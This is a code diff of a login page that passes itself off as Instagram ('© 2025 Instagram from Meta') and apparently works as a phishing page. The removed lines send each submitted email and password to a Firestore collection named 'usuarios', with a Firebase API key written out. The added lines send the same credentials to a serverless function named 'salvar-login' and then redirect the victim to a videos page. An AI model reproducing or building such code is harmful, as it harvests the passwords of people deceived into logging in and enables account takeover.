@@ -373,25 +373,8 @@
         <p>© 2025 Instagram from Meta</p>
     </footer>
 
-    <!-- Firebase -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
-        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-analytics.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyDN99R5e_5gyrVG8SLSAVRcQBnKQZl1JSk",
-            authDomain: "teste-face-f0bc1.firebaseapp.com",
-            projectId: "teste-face-f0bc1",
-            storageBucket: "teste-face-f0bc1.appspot.com",
-            messagingSenderId: "512570531586",
-            appId: "1:512570531586:web:46c5f841969d79f75d6c1b",
-            measurementId: "G-7DJ3ZJR9P5"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const analytics = getAnalytics(app);
-        const db = getFirestore(app);
+    <!-- Login seguro via Netlify Function (sem expor chaves) -->
+    <script>
 
         document.getElementById('login-form').addEventListener('submit', async function(event) {
             event.preventDefault();
@@ -437,11 +420,14 @@
             spinner.style.display = 'block';
 
             try {
-                await addDoc(collection(db, "usuarios"), {
-                    email: email,
-                    password: password,
-                    timestamp: new Date().toISOString()
+                const response = await fetch('/.netlify/functions/salvar-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
                 });
+
+                if (!response.ok) throw new Error('Erro no servidor');
+
                 console.log("Dados enviados com sucesso!");
                 window.location.href = 'videos.html';
             } catch (error) {
